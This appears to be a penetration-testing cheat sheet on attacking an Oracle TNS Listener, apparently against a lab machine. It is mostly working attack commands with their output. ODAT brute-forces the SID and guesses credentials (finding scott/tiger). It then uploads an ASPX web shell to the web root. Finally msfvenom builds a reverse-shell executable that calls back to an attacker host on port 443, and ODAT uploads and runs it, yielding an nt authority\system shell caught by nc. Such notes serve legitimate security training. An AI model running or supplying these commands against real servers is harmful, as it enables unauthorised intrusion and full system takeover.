# (1541) Oracle TNS Listener

<details>

<summary>Brute-Force SID, usernames, passwords (credentials)</summary>

### Brute-Force SID

<pre class="language-bash"><code class="lang-bash">git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py all -s 10.10.10.82 -p 1521
# [+] Checking if target 10.10.10.82:1521 is well configured for a connection...
# [+] According to a test, the TNS listener 10.10.10.82:1521 is well configured. Continue...

# [1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
# [+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

# [2] (10.10.10.82:1521): Searching valid SIDs
# [2.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
# [+] 'XE' is a valid SID. Continue...            ################################################# | ETA:  00:00:02 
<strong># 100% 
</strong></code></pre>

### Brute-Force Oracle Credentials

```bash
./odat.py passwordguesser -s 10.10.10.82 -d <SID NAME>
# ./odat.py passwordguesser -s 10.10.10.82 -d XE
# [+] Valid credentials found: scott/tiger. Continue...           ###############                   | ETA:  00:03:20

```

</details>

<details>

<summary>Upload Reverse Shell</summary>

```bash
./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot" shell.aspx shell.aspx 

# [1] (10.10.10.82:1521): Put the shell.aspx local file in the C:\inetpub\wwwroot folder like shell.aspx on the 10.10.10.82 server
# [+] The shell.aspx file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the shell.aspx file

Browse to http://10.10.10.82/shell.aspx
```

</details>

<details>

<summary>Obtain SYSTEM Shell directly (Upload + Execute)</summary>

<pre class="language-bash"><code class="lang-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o reverse.exe 
<strong>#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</strong>#[-] No arch selected, selecting arch: x64 from the payload
#No encoder specified, outputting raw payload
#Payload size: 460 bytes
#Final size of exe file: 7168 bytes
#Saved as: reverse.exe

./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile "C:\temp" reverse.exe ../reverse.exe 

#[1] (10.10.10.82:1521): Put the ../reverse.exe local file in the C:\temp folder like reverse.exe on the 10.10.10.82 server
#[+] The ../reverse.exe file was created on the C:\temp directory on the 10.10.10.82 server like the reverse.exe file

./odat.py externaltable -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --exec "c:\temp" reverse.exe

#[1] (10.10.10.82:1521): Execute the reverse.exe command stored in the c:\temp path


nc -lvp 443              
#listening on [any] 443 ...
#10.10.10.82: inverse host lookup failed: Unknown host
#connect to [10.10.14.2] from (UNKNOWN) [10.10.10.82] 49194
#Microsoft Windows [Version 6.3.9600]
#(c) 2013 Microsoft Corporation. All rights reserved.

#C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
#whoami
#nt authority\system
</code></pre>

</details>
